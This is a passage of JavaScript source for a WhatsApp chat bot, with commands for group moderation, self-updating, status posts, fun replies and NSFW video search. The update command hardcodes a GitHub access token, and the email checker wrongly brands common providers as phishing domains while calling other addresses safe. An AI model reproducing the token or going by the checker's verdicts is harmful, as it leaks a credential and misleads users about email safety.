const imageUrl = 'https://files.catbox.moe/tpm9o7.jpg';
await HeavstalTech.sendMessage(m.chat, {
 image: { url: imageUrl }, // Directly use the URL for the image
 caption: profile, // Custom message with check result and mentioned user
 mentions: [bet] // Mentions the mentioned user
});
}
break;
//=================================================//


//=================================================//
case 'getpic':
case 'getpp': {
Vreply("Fetching User Profile Picture")
if (qtod === "true") {
try {
pporg = await HeavstalTech.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
HeavstalTech.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await HeavstalTech.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
HeavstalTech.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}
break;
//=================================================//


//=================================================//
case 'mute': {
    if (!m.isGroup) return Vreply('This command can only be used in groups.');
    if (m.isGroup && !isAdmin) return Vreply('Only admins can mute the group!');
    if (m.isGroup && !isBotAdmin) return Vreply('Bot must be admin to mute the group.');

    try {
        await HeavstalTech.groupSettingUpdate(m.chat, 'announcement');
        Vreply('🔇 *Group muted.* Only admins can send messages.');
    } catch (error) {
        console.error(error);
        Vreply('❌ Failed to mute the group.');
    }
}
break;
//=================================================//


//=================================================//
case 'unmute': {
    if (!m.isGroup) return Vreply('This command can only be used in groups.');
    if (m.isGroup && !isAdmin) return Vreply('Only admins can unmute the group!');
    if (m.isGroup && !isBotAdmin) return Vreply('Bot must be admin to unmute the group.');

    try {
        await HeavstalTech.groupSettingUpdate(m.chat, 'not_announcement');
        Vreply('🔊 *Group unmuted.* Everyone can send messages.');
    } catch (error) {
        console.error(error);
        Vreply('❌ Failed to unmute the group.');
    }
}
break;
//=================================================//


//=================================================//
case 'delete':
case 'del': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!m.quoted) return Vreply("⚠️ Please reply to the message you want to delete.");
    if (m.isGroup) {
        if (!isBotAdmin) return Vreply(mess.badmin); 
        if (!(isAdmin || isOwner))
            return Vreply("⚠️ Only group admins or the bot owner can delete messages.");
    } else {
        if (!isOwner) 
            return Vreply("⚠️ Only the bot owner can delete messages in private chats.");
    }

    try {
        await HeavstalTech.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: m.quoted.id,
                participant: m.quoted.sender
            }
        });
        Vreply("✅ Message deleted successfully.");
    } catch (e) {
    console.log(e);
        Vreply("❌ Failed to delete the message.");
    }
}
break;
//=================================================//


//=================================================//
case 'update': {
    if (!isOwner) return Vreply('You are not authorized to use this command.');

    Vreply(mess.wait);
    await loading();

    const token = 'github_pat_' + '11BRHN4AI0vsSnigna8RsR_zKWGqGobgKJmlQhAz3urijFRxUHv5YGWK2ibIjbYTiZNPFV7OO5igVPRTdy';
    const repoOwner = 'HeavstalTech';
    const repoName = 'Verselor-V1';
    const { exec } = require('child_process');

    try {
        if (isCloud()) {
            Vreply("☁️ *Cloud Environment Detected.*\nSyncing with GitHub repository...");
            exec(`git pull https://${token}@github.com/${repoOwner}/${repoName}.git`, async (err, stdout) => {
                if (err) return Vreply(`❌ Git Pull Failed: ${err.message}`);
                if (stdout.includes('Already up to date')) return Vreply('✅ System is already running the latest version.');
                
                Vreply(`✅ *Update Successful!*\n\n${stdout}\n\nRequesting clean system reboot...`);
                await sleep(3000);
                
                if (process.send) {
                    process.send('reset'); 
                } else {
                    process.exit(1); 
                }
            });
            return;
        }

        const commitRes = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/commits`, {
            headers: { 'Authorization': `token ${token}` }
        });
        const commits = await commitRes.json();
        const latestCommitSha = commits[0].sha;
        const commitFile = path.join(__dirname, '..', 'current_commit.txt');

        let storedCommitSha = fs.existsSync(commitFile) ? fs.readFileSync(commitFile, 'utf8') : '';
        if (latestCommitSha === storedCommitSha) return Vreply('✅ Already up to date.');

        Vreply('📦 Syncing new files from GitHub...');
        const contentRes = await fetch(`https://api.github.com/repos/${repoOwner}/${repoName}/contents`, {
            headers: { 'Authorization': `token ${token}` }
        });
        const files = await contentRes.json();

        for (let file of files) {
            if (file.type === 'file') {
                const fileData = await (await fetch(file.download_url)).arrayBuffer();
                fs.writeFileSync(path.join(__dirname, '..', file.path), Buffer.from(fileData));
            }
        }

        fs.writeFileSync(commitFile, latestCommitSha, 'utf8');
        Vreply('✅ *Files Synced.* Rebooting...');
        await sleep(3000);
        
        if (process.send) {
            process.send('reset');
        } else {
            process.exit(1);
        }

    } catch (error) {
        Vreply('❌ Update Error.');
    }
}
break;
//=================================================//


//=================================================//
case 'restart':
case 'reboot': {   
    if (!isCreator) return Vreply(mess.owner);
    if (isCloud()) {
        Vreply("Restarting Bot In 3 seconds...");
        await sleep(3000);
        if (process.send) process.send('reset');
    } else {
    Vreply("Restarting Bot In 3 seconds...");
        await sleep(3000);
    process.exit(1);
    }
}
break;
//=================================================//
                

//=================================================//
case 'shutdown': {
    if (!isCreator) return Vreply(mess.owner);
    if (isCloud()) {
      Vreply ("It has been detected that you're deploy on a cloud server and there shutting dowm this bot is not available to you.")
    } else {   
        Vreply("Verselor-V1 is signing off.....");
        process.exit(0);
     }
}
break;
//=================================================//


//=================================================//
case 'tagadmin':
case 'listadmin':
case 'admin': {
    if (!isOwner) return Vreply(mess.owner);
    if (!m.isGroup) return Vreply(mess.only.group);

    const groupMetadata = await HeavstalTech.groupMetadata(m.chat);
    const participants = groupMetadata.participants;

    const groupAdmins = participants.filter(p => p.admin);
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');

    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net';

    let text = `*Group Admins:*\n${listAdmin}`;
    HeavstalTech.sendMessage(m.chat, {
        text: text,
        mentions: [...groupAdmins.map(v => v.id), owner]
    }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case 'left':
case 'leave': {
    if (!isOwner) return Vreply(mess.owner);
    if (!m.isGroup) return Vreply(mess.only.group);
    try {
        await HeavstalTech.groupLeave(m.chat);
        await Vreply('✅ Left the group.');
    } catch (error) {
        console.error(error);
        Vreply('❌ Failed to leave the group.');
    }
}
break;
//=================================================//


//=================================================//
case 'auto-typing':
case 'autotyping':
    if (!isOwner) return Vreply(mess.owner)

    if (!text) return Vreply(`Select *on* or *off*\n\nExample: ${prefix + command} on`)

    if (args[0].toLowerCase() === 'on') {
        global.autoTyping = true
        Vreply(`*✅ Auto-Typing has been activated*\n\n${footer}`)
} else if (args[0].toLowerCase() === 'off') {
        global.autoTyping = false
        Vreply(`*🛑 Auto-Typing has been deactivated*\n\n${footer}`)
} else {
        Vreply(`Invalid option.\nPlease use: *${prefix + command} on* or *${prefix + command} off*`)
}
    break;
//=================================================//    
    

//=================================================//
case 'auto-recordtype':
case 'autorecordtype':
    if (!isOwner) return Vreply(mess.owner)

    if (!text) return Vreply(`Select *on* or *off*\n\nExample: ${prefix + command} on`)

    if (args[0].toLowerCase() === 'on') {
        global.autoRecordType = true
        Vreply(`*✅ Auto-RecordType has been activated*\n\n${footer}`)
} else if (args[0].toLowerCase() === 'off') {
        global.autoRecordType = false
        Vreply(`*🛑 Auto-RecordType has been deactivated*\n\n${footer}`)
} else {
        Vreply(`Invalid option.\nPlease use: *${prefix + command} on* or *${prefix + command} off*`)
}
    break;
//=================================================//    
    

//=================================================//
case 'auto-statusview':
case 'autoswview':
    if (!isOwner) return Vreply(mess.owner)

    if (!text) return Vreply(`Select *on* or *off*\n\nExample: ${prefix + command} on`)

    if (args[0].toLowerCase() === 'on') {
        global.autoViewStatus = true
        Vreply(`*✅ Auto-ViewStatus has been activated*\n\n${footer}`)
} else if (args[0].toLowerCase() === 'off') {
        global.autoViewStatus = false
        Vreply(`*🛑 Auto-ViewStatus has been deactivated*\n\n${footer}`)
} else {
        Vreply(`Invalid option.\nPlease use: *${prefix + command} on* or *${prefix + command} off*`)
}
    break;
//=================================================//    
    

//=================================================//
case 'auto-read':
case 'autoread':
    if (!isOwner) return Vreply(mess.owner)

    if (!text) return Vreply(`Select *on* or *off*\n\nExample: ${prefix + command} on`)

    if (args[0].toLowerCase() === 'on') {
        global.autoRead = true
        Vreply(`*✅ Auto-Read has been activated*\n\n${footer}`)
} else if (args[0].toLowerCase() === 'off') {
        global.autoRead = false
        Vreply(`*🛑 Auto-Read has been deactivated*\n\n${footer}`)
} else {
        Vreply(`Invalid option.\nPlease use: *${prefix + command} on* or *${prefix + command} off*`)
}
    break;
//=================================================//    
  
      
//=================================================//    
case 'auto-recording':
case 'autorecording':
    if (!isOwner) return Vreply(mess.owner)

    if (!text) return Vreply(`Select *on* or *off*\n\nExample: ${prefix + command} on`)

    if (args[0].toLowerCase() === 'on') {
        global.autoRecord = true
        Vreply(`*✅ Auto-Recording has been activated*\n\n${footer}`)
} else if (args[0].toLowerCase() === 'off') {
        global.autoRecord = false
        Vreply(`*🛑 Auto-Recording has been deactivated*\n\n${footer}`)
} else {
        Vreply(`Invalid option.\nPlease use: *${prefix + command} on* or *${prefix + command} off*`)
}
    break;
//=================================================//    
    

//=================================================//
case 'join': {
if (!isOwner) return Vreply(mess.owner)
if (!text) throw 'Enter the group link!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
Vreply("Joining Group Chat")
let result = args[0].split('https://chat.whatsapp.com/')[1]
await HeavstalTech.groupAcceptInvite(result).then((res) => Vreply(jsonformat(res))).catch((err) => Vreply(jsonformat(err)))
}
        break;
//=================================================//        


//=================================================//        
case 'alive':
case 'Alive': {
    const olosho = `${global.AliveMsg}` + `\n\n${botname} has been up for: ${runtime(process.uptime())}\n\n${footer}` || `*${botname} Is Online And Alive*\n\n${botname}has been up for: ${runtime(process.uptime())}\n\n${footer}`

    // Send Alive Message with Image
    HeavstalTech.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/g8pxls.png' },
        caption: olosho
    });

    // Send Audio After Alive Message
    HeavstalTech.sendMessage(m.chat, {
        audio: { url: 'https://files.catbox.moe/9espfe.mp3' },
        mimetype: 'audio/mpeg', caption: '',
        ptt: true // Set to true if you want it as a voice note
    });

}
break;
//=================================================//


//=================================================//
case 'shorturl': 
case 'tinyurl': {
    if (!text) return Vreply('❌ *Please provide a valid URL to shorten.*\n\nExample: `.shorturl https://example.com`');

    try {
        const shortUrl = await (await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`)).text();
        if (!shortUrl || shortUrl.includes("Error")) {
            return Vreply(`⚠️ *Error: Failed to generate a short URL. Please check the link.*`);
        }

        let replyMsg = `
🔗 *URL Shortener by Verselor-V1*

📎 *Original Link:*
${text}

🔀 *Shortened:*
${shortUrl}

${footer}
        `.trim();

        Vreply(replyMsg);
    } catch (err) {
        console.error('ShortURL Error:', err.message);
        Vreply('❌ *Server error. Please try again later.*');
    }
}
break;
//=================================================//


//=================================================//
case "checkmail": {
  const args = text.split(" ").slice(1);
  const email = args[0]?.trim();

  if (!email) {
    return Vreply(`❓ Please provide an email address.\nExample:\n${prefix}checkmail example@gmail.com\n\n${footer}`);
  }

  // Modern regex for most valid emails
  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (!emailRegex.test(email)) {
    return Vreply(`🚫 The email address ${email} is invalid.\n\n${footer}`);
  }

  const domain = email.split("@")[1].toLowerCase();

  // Advanced blacklist (disposable + risky/spammy domains)
  const advancedBlacklistedDomains = [
    // Common disposable domains
    "example.com", "tempmail.com", "10minutemail.com", "mailinator.com", "guerrillamail.com",
    "yopmail.com", "dispostable.com", "maildrop.cc", "fakeinbox.com", "trashmail.com",
    "throwawaymail.com", "getnada.com", "mintemail.com", "sharklasers.com", "mailcatch.com",
    "spamgourmet.com", "disposablemail.com", "fakemail.net", "temporarymail.com", "mailtemp.net",

    // Common spammy or high-risk domains (used in phishing or scams)
    "mail.ru", "qq.com", "163.com", "hotmail.co.uk", "live.com", "inbox.com",
    "rocketmail.com", "aol.com", "zoho.com", "fastmail.com"
  ];

  if (advancedBlacklistedDomains.includes(domain)) {
    return Vreply(`🚫 The email domain ${domain} is blacklisted. ❌ This may be disposable, risky, or often used for spam/phishing.`);
  }

  return Vreply(`✅ The email address ${email} is valid and safe to use.\n\n${footer}`);
}
break;
//=================================================//


//=================================================//
  case "time": {
    let currentDate = new Date();
    let hours = currentDate.getHours();
    let minutes = currentDate.getMinutes();
    let seconds = currentDate.getSeconds();
    minutes = minutes < 10 ? '0' + minutes : minutes;
    seconds = seconds < 10 ? '0' + seconds : seconds;
    let formattedTime = `${hours}:${minutes}:${seconds}`;
    let day = currentDate.toLocaleDateString('en-US', { weekday: 'long' });
    let date = currentDate.toLocaleDateString();
    let ReponseText = `
🌟 *Current Time* 🌟
====================

⏰ *Time:* ${formattedTime}  
📅 *Day:* ${day}  
🗓️ *Date:* ${date}

====================
${footer}
`;
  Vreply(ReponseText);
  }
  break;
//=================================================//
  
    
//=================================================//  
    case "learn_coding":
    case "coding": 
    {
    let CodingText = `
❏━『 𝗟𝗘𝗔𝗥𝗡 𝗖𝗢𝗗𝗜𝗡𝗚 』━❏
📚 Want to start coding? Here are some sources to get started with:

🔹 *Python:* https://www.w3schools.com/python
🔹 *JavaScript:* https://www.w3schools.com/js
🔹 *HTML & CSS:* https://www.w3schools.com/html
🔹 *FreeCodeCamp:* https://www.freecodecamp.org

🚀 Start your journey today & Good Luck!\n\n${footer}
`;
    Vreply(CodingText);
  }
  break;
//=================================================//
  
 
//=================================================// 
case "morning": {
    const currentHour = new Date().getHours();
    if (currentHour <= 5) return Vreply("It's not yet morning but have a great day anyways 🌹❤️");
    if (currentHour >= 5 && currentHour < 12) {
      Vreply("Good Morning! ☀️ Have a wonderful day ahead!");
    } else {
      Vreply("It's not morning anymore. But good day anyway! 😊");
    }
  }
  break;
//=================================================//
  

//=================================================//
case "afternoon": {
    const currentHour = new Date().getHours();
    if (currentHour <= 12) return Vreply("It's not yet afternoon, it's still morning, but have a great day anyways 🌹❤️");
    if (currentHour >= 12 && currentHour < 16) {
      Vreply("Good Afternoon! 🌞 Hope you're having a great day!");
    } else {
      Vreply("It's not afternoon anymore. But I hope you're having a great day!");
    }
  }
  break;  
//=================================================//  
 
  
//=================================================//   
case "evening": {
    const currentHour = new Date().getHours();
    if (currentHour <= 16) return Vreply("It's not yet evening, it's still afternoon, but have a great day anyways 🌹❤️");
    if (currentHour >= 16 && currentHour < 23) {
      Vreply("Good evening! 🌙 Hope you're getting ready to sleep 😴?");
    } else {
      Vreply("It's not evening anymore. But I hope you're having a great day!");
    }
  }
  break;
//=================================================//  


//=================================================// 
case 'prohecy': 
case 'fortune': {
    const prophecies = [
        "🔥 You will rise as a leader... only to be betrayed by those closest to you.",
        "🌑 Darkness follows you. Within 7 days, misfortune will strike.",
        "⚡ A great victory awaits you—but beware, it comes at a cost.",
        "💀 Someone in this group will turn against you soon.",
        "🔮 Your fate is intertwined with chaos itself. Nothing is certain.",
        "👑 You will be crowned victorious. But the price? Isolation.",
        "⚠️ Beware of your next decision—it holds the key to your downfall.",
        "💡 You will unlock forbidden knowledge, but it may change you forever.",
        "🌪️ A storm is coming—whether it is physical or emotional is unknown.",
        "🌀 The universe has chosen you for something greater. Are you ready?",
        "🚀 Something big will happen in your life soon—but will it be good or bad?",
        "💀 You are being watched. By whom? That remains a mystery.",
        "🔥 The next person to message will alter your fate in ways you don’t expect.",
        "🎭 Someone in this group is not who they claim to be.",
        "⚡ A revelation will shake your reality. You must decide how to handle it.",
        "🕰️ In time, all secrets come to light. Be careful what you hide.",
        "☠️ You will lose something important. It may be an object… or a person.",
        "🩸 You have a hidden enemy. Soon, they will reveal themselves.",
        "👀 Someone in this group thinks about you more than you realize.",
        "🌓 A choice is coming. The path you take will determine your destiny.",
        "🔥 You will hear unexpected news in the next 48 hours—be ready.",
        "🚷 Do not send your next message. It may lead to consequences.",
        "🎭 The truth has been hidden from you. Soon, you will uncover it.",
        "🛑 Your journey will soon take an unexpected turn. Brace yourself.",
        "🌑 You have crossed paths with fate. Now, there is no turning back.",
        "⚠️ Beware of an offer coming your way. It may not be what it seems.",
        "🔥 You are closer to achieving greatness than you realize.",
        "🕵️ Someone is keeping a secret from you. Will you uncover it?",
        "💀 Today, luck is against you. Be cautious in your actions.",
        "💔 A betrayal is coming. From friend or foe, time will tell.",
        "🌊 Your emotions are stronger than you know. They will shape your next move.",
        "🔑 The key to your success lies where you least expect it.",
        "⚡ You will gain something valuable soon. Will you use it wisely?",
        "🌟 A moment of glory awaits you—but beware the consequences.",
        "🌑 You have attracted the attention of forces beyond your control.",
        "🛡️ Someone is protecting you, even though you cannot see them.",
        "💬 A conversation soon will change your perspective entirely.",
        "🔥 You will receive something unexpected—how you react will define you.",
        "📜 You will hear words today that will echo for years to come.",
        "☠️ Someone will challenge you. Are you prepared for the fight?",
        "🚪 A door will open soon—but stepping through it may change everything.",
        "💭 You dream of something often… it may manifest in reality.",
        "⚖️ A decision approaches. It will weigh heavily on your future.",
        "🐍 Be wary of deception. Someone is not telling the full truth.",
        "🌀 You are at a crossroads. Your next move will determine your fate.",
        "⚡ Power is within your grasp. But can you handle it?",
        "🕰️ Time moves differently for you today. Pay close attention.",
        "🕊️ You will find peace soon—but it may not come the way you expect.",
        "🔥 A fire will burn within you, igniting your next ambition.",
        "🔄 An event from your past will resurface. Will you face it?",
        "💎 Something priceless will soon be within reach.",
        "⚠️ Someone is watching your actions. Choose wisely.",
        "🌑 A familiar face will return, but they will not be as they once were.",
        "🔮 The future shifts with every choice. What will you decide?",
        "🎭 A masked truth will be revealed in the coming days.",
        "💔 Someone is holding onto something they need to let go of.",
        "🚀 Your next move will define your legacy.",
        "📖 A story is being written about you. What role will you play?",
        "🔪 You must cut ties with something before it consumes you.",
        "☀️ A new light will shine on your path.",
        "🌀 Chaos is brewing—but you may thrive within it.",
        "🛑 You will be forced to stop and rethink everything.",
        "🔁 A cycle you thought was finished will begin again.",
        "🎯 Fate will test your patience soon.",
        "💭 You will learn something today that shakes you to the core.",
        "🦉 Wisdom comes from experience. You are about to gain some.",
        "🔑 A puzzle you’ve struggled with will finally make sense.",
        "🌪️ A whirlwind of events approaches—brace yourself.",
        "🔥 Someone will challenge your beliefs. How will you respond?",
        "⚡ A spark of genius is coming—don't ignore it.",
        "🕊️ A moment of tranquility is approaching—enjoy it while it lasts.",
        "🎭 The truth is closer than you think. Look carefully.",
        "💀 A shift in the balance will occur soon—who will come out stronger?",
        "☠️ Something in your life is ending—but with every end comes a new beginning."
    ];

    const NanoProphecy = prophecies[Math.floor(Math.random() * prophecies.length)];
    const bufferProphecy = await getBuffer(`https://files.catbox.moe/g3b32g.jpg`);

    HeavstalTech.sendMessage(from, { 
        image: bufferProphecy, 
        caption: `_Your Prophecy:_\n${NanoProphecy}` 
    }, { quoted: m });
}
break;
//=================================================//


//=================================================//
case 'aza': {
if (!isCreator) return Vreply(mess.owner)
  global.bankList = global.bankList || {};
  let sender = m.key.participant || m.key.remoteJid;

  let data = global.bankList[sender];

  if (!data) {
    await HeavstalTech.sendMessage(m.key.remoteJid, {
      text: `\`No bank info found.\nUse\` \`setaza owner | bank name | bank acct\`.`,
      quoted: m
    });
    return;
  }

  const replyText = `,\`🏦 BANK DETAILS\` \n*Bank Owner:* _${data.owner}_\n*Bank Name:* _${data.bankName}_\n*Account Number:* _${data.bankCode}_\n`;

  await HeavstalTech.sendMessage(m.key.remoteJid, {
    text: replyText,
    quoted: m
  });
  break;
}
//=================================================//


//=================================================//
case 'setaza': {
if (!isOwner) return Vreply(mess.owner);
  global.bankList = global.bankList || {};
  let sender = m.key.participant || m.key.remoteJid;

  const text2 = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
  const args = text2.split(' ').slice(1).join(' ').split('|');

  if (args.length < 3) {
    await HeavstalTech.sendMessage(m.key.remoteJid, {
      text: `\`Wrong format!\nUse:\` *.setaza account-name| bank-name | bank-number*`,
    });
    return;
  }

  const [owner, bankName, bankCode] = args.map(a => a.trim());

     global.db.data.bankData[m.sender] = {
        owner,
        bankName,
        bankCode,
    };
    
    await global.db.write();

  await HeavstalTech.sendMessage(m.key.remoteJid, {
    text: `\`BANK DATA SAVED\`\nType .aza if you want to see the saved details \nBank Owner: ${owner}, Bank Name: ${bankName},\nBank Number: ${bankCode}, `,
  });
  break;
}
//=================================================//


//=================================================//
case 'delaza': {
if (!isOwner) return Vreply(mess.owner);
  global.bankList = global.bankList || {};
  let sender = m.key.participant || m.key.remoteJid;

  if (!global.bankList[sender]) {
    await HeavstalTech.sendMessage(m.key.remoteJid, {
      text: `\n*Succesfully Delete Account Details*`,
      quoted: m
    });
    return;
  }

  delete global.bankList[sender];
  await global.db.write();

  await HeavstalTech.sendMessage(m.key.remoteJid, {
    text: "*Your bank info has been Deleted*\nAdd New Bank Deltails With .setaza <info>\n\n> `© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʜᴇᴀᴠsᴛᴀʟ ᴛᴇᴄʜ`",
    quoted: m
  });
  break;
}
//=================================================//


//=================================================//
case 'delchat':
case 'clearchat': {
if (!isOwner) return Vreply(mess.owner)
await HeavstalTech.chatModify({delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]}, from)
reply(`*Successfully Cleared Chat*\n\n${footer}`)
}
break;
//=================================================//


//=================================================//
case 'upsw':
case 'up-status':
case 'status': {
        {        
          if (!isOwner) return Vreply(mess.owner)
          if (!text || !m.quoted) return Vreply(`Please send/reply to a message with the caption ${prefix + command}`);
          if (/image/.test(mime)) {
            let imgSw = await HeavstalTech.downloadAndSaveMediaMessage(quoted);
            await HeavstalTech.sendMessage(
              "status@broadcast",
              { image: { url: imgSw}, caption: q},
              { statusJidList: pendaftar},
);
             Vreply('*Done...*')
} else if (/video/.test(mime)) {
            let VidSw = await HeavstalTech.downloadAndSaveMediaMessage(quoted);
            await HeavstalTech.sendMessage(
              "status@broadcast",
              { video: { url: VidSw}, caption: q},
              { statusJidList: pendaftar},
);
            Vreply('*Done...*')

} else if (/audio/.test(mime)) {
            let VnSw = await HeavstalTech.downloadAndSaveMediaMessage(quoted);
            await HeavstalTech.sendMessage(
              "status@broadcast",
              { audio: { url: VnSw}, mimetype: "audio/mp4", ptt: true},
              { backgroundColor: "#FF000000", statusJidList: pendaftar}, // #FF000000
);
            Vreply('*Done...*')
} else if (q) {
            HeavstalTech.sendMessage(
              "status@broadcast",
              { text: q},
              { backgroundColor: "#FF000000", font: 3, statusJidList: pendaftar},
);
} else {
            Vreply(`Please send/reply to a message with the caption ${prefix + command}`);
}}
}
break;
//=================================================//


//=================================================//
case 'gcstatus':
case 'upswgc': {
    if (!m.isGroup) return Vreply(mess.only.group);
    if (!isOwner && !isAdmin) return Vreply(mess.only.admin);
    
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    const isImage = /image/.test(mime);
    const isVideo = /video/.test(mime);
    const isAudio = /audio/.test(mime);

    if (!isImage && !isVideo && !isAudio && !text) {
        return Vreply(`*Usage:* Reply to media or type text.\n\n*Example:* ${prefix + command} Hello Group`);
    }

    await HeavstalTech.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        if (isImage || isVideo || isAudio) {
            const mediaBuffer = await HeavstalTech.downloadMediaMessage(quoted);

            let statusOptions = {};
            if (isImage) statusOptions = { image: mediaBuffer, caption: text };
            else if (isVideo) statusOptions = { video: mediaBuffer, caption: text };
            else if (isAudio) statusOptions = { audio: mediaBuffer, mimetype: 'audio/mp4' };

            await HeavstalTech.sendGroupStatus(m.chat, statusOptions, { quoted: m });
        } 
        else {
            await HeavstalTech.sendGroupStatus(m.chat, { text: text }, { quoted: m });
        }

        await HeavstalTech.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        console.error("[GC STATUS ERROR]", e);
        Vreply(`*Failed to post group status.*\n_Error: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'unblock': case 'unblocked': {
	 if (!isOwner) return Vreply(mess.owner);
	 if (m.mentionedJid.length > 0 || m.quoted) {
    return Vreply(usageMessage);
}
let targetJid = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let users = targetJid
  let victim = users

if (victim == ownernumber + "@s.whatsapp.net") {
    return Vreply("*ACCESS DENIED*\nYou Can Initiate This Command On This User. Try Another User!");
    }
    if (victim == ownernumber2 + "@s.whatsapp.net") {
    return Vreply( "*ACCESS DENIED*\nYou Can Initiate This Command On This User. Try Another User!");
    }
    if (victim == BotNum + "@s.whatsapp.net") {
    return Vreply("*ACCESS DENIED*\nYou Can Initiate This Command On This User. Try Another User!");
}
// --- MODIFICATION END ---
		await HeavstalTech.updateBlockStatus(users, 'unblock')
		await Vreply(`*Done*`)
	}
	break;
//=================================================//	


//=================================================//	
	case 'block': case 'blocked': {	
	 if (!isOwner) return Vreply(mess.owner);
	 if (m.mentionedJid.length > 0 || m.quoted) {
    return Vreply(usageMessage);
}
let targetJid = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let users = targetJid
		await HeavstalTech.updateBlockStatus(users, 'block')
		await Vreply(`*Done*`)
			}
	break;
//=================================================//
	
      
//=================================================//
      case 'xnxxsearch': {
      if (!isOwner) return Vreply(mess.owner);
      if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw);
	if (!text) return Vreply(`*Enter Query*\n\nExmaple ${prefix}xnxxsearch Stepmom`)
	reply(mess.wait)
	Vreply(mess.wait)
await loading();
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n\n${footer}`).join('\n') 
              if (res.status) return Vreply(ff)
              }
              break;
//=================================================//              


//=================================================//              
              case 'xnxxdl': {
	if (!isOwner) return Vreply(mess.owner);
	if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw);
	if (!text) return Vreply(`Provide an xnxx link to download\n\n${footer}`)
        if (!text.includes('xnxx.com')) return Vreply(`Enter an xnxx link`)
        Vreply(mess.wait)
        await loading();
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
HeavstalTech.sendMessage(m.chat, { caption: `${MenuStyle}  *XNXX DL*
        
▢ *📌Title*: ${xn.result.title}
▢ *⌚Duration* ${xn.result.duration}
▢ *🎞️Quality:* ${xn.result.quality}`, video: {url: xn.result.files.high} }, { quoted: m })
}
break;
//=================================================//
 
              
//=================================================//               
case 'toimage': 
case 'toimg': {
if (!quoted) Vreply('Reply to a sticker')
if (!/webp/.test(mime)) Vreply(`Reply to a sticker`)
let media = await HeavstalTech.downloadAndSaveMediaMessage(quoted)
let ran = 'tempImg.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) Vreply(err)
let buffer = fs.readFileSync(ran)
HeavstalTech.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break 
//=================================================//

             
//=================================================//
case 'xvideosearch':{
if (!global.db.data.chats[m.chat]?.nsfw) return Vreply(mess.nsfw);
if (!isCreator) return Vreply(mess.owner);
  if (!text) return Vreply("Example: .xvideosearch Stepmom")
  try {
    // checking data from api
    let res = await fetch(`https://api.agatz.xyz/api/xvideo?message=${encodeURIComponent(text)}`);
    let json = await res.json();

    // checking api response status
    if (json.status !== 200 || !json.data || json.data.length === 0) {
      throw 'No videos found for this keyword.';
    }

    // fetching search data from api
    let videos = json.data;
    let message = `𝐕𝐄𝐑𝐒𝐄𝐋𝐎𝐑 𝐕𝟏 ²⁶\nxvideo search result\n\n *"${text}"*:\n`;

    // Composing messages with video information
    videos.forEach(video => {
      message += `Title: ${video.title || 'no name'}\n` +
                 `  Duration: ${video.duration || 'no duration'}\n` +
                 `  URL: ${video.url || 'no URL'}\n` +
                 `  Thumbnail: ${video.thumb || 'no thumbnail'}\n\n`;
    });

    // Sending messages with video lists
    await HeavstalTech.sendMessage(m.chat, {
      text: message,
    });

  } catch (e) {
    // Handling errors and sending error messages
    await HeavstalTech.sendMessage(m.chat, `can't fetch result from query`);
  }
}
break;
//=================================================//


//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
